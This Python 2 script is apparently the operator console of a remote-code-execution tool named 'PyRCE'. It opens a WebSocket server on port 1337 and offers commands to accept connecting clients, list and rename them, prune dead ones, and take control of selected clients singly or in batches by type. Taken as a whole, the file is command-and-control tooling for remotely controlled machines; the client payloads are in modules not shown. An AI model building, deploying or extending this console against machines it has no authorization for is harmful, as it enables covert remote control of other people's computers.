# -*- coding: utf-8 -*-

import logging
import signal
import sys
import threading
from sockets import WebsocketServer

from clients import CLIENTS as SOCKET_CLIENTS

from printer import Printer


if __name__ == "__main__":

    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    ch = logging.StreamHandler(sys.stdout)
    logger.addHandler(ch)
    # fh = logging.FileHandler("output.log")
    # logger.addHandler(fh)

    try:
        server = WebsocketServer("0.0.0.0", 1337)
        p = Printer()
        p.info("PyRCE - Commands: listen, list, control, update, rename")
        while True:
            cmd = raw_input('> ')
            if cmd == "listen":
                p.prompt("Which client are you accepting?")
                for c in SOCKET_CLIENTS.keys():
                    if c != "BASE":
                        p.info(c)

                cmd = raw_input()
                if SOCKET_CLIENTS.get(cmd) is None:
                    p.error("Not a valid client type.")
                    continue
                server.listen(cmd, persist=True)
            if cmd == "list":
                if server.CLIENTS == []:
                    p.info("There are no clients connected. Use 'listen' to collect clients.")
                else:
                    for i,c in enumerate(server.CLIENTS):
                        p.info("{}. {}".format(i+1, c))
            
            if cmd == "update":
                new_clients = []
                for client in server.CLIENTS:
                    if client.is_alive():
                        new_clients.append(client)
                    else:
                        p.warn("{} is dead, removing.".format(client))
                server.CLIENTS = new_clients
                p.success("Successfully removed dead clients.")

            if cmd == "rename":
                p.prompt("Which client? (1 2 ...)")
                for i,c in enumerate(server.CLIENTS):
                    p.info("{}. {}".format(i+1, c))

                client_num = int(raw_input())

                p.prompt("What name?")

                client_name = str(raw_input())

                try:
                    client = server.CLIENTS[client_num - 1]
                    client.rename(client_name)
                except IndexError as e:
                    p.error("Cannot name that client.")


            if cmd == "control":
                p.prompt("Which clients? (1 2 ...)")
                for i,c in enumerate(server.CLIENTS):
                    p.info("{}. {}".format(i+1, c))

                cmd = raw_input()

                try:
                    indices = [int(i) for i in cmd.split(' ')]
                    sockets = []
                    for i,c in enumerate(server.CLIENTS):
                        if i + 1 in indices:
                            sockets.append(c)
                    server.control_clients(sockets)
                except Exception as e:
                    p.error("Unable to use these clients.")
                    p.error(str(e))

            if cmd == "control batch":
                p.prompt("Which client types?")
                clients = {}
                for client in server.CLIENTS:
                    if clients.get(client.__class__.__name__) is None:
                        clients[client.__class__.__name__] = []
                    clients[client.__class__.__name__].append(client)

                for i, ctype in enumerate(clients.keys()):
                    p.info("{}. {} - {} clients".format(i, ctype, len(clients[ctype])))

                try:
                    cmd = int(raw_input())
                    server.control_clients(clients[clients.keys()[cmd]])
                except Exception as e:
                    p.error("Unable to use these clients.")
                    p.error(str(e))


    except KeyboardInterrupt:
        p.info("Closing connection...")
        server.close_websocket_client()
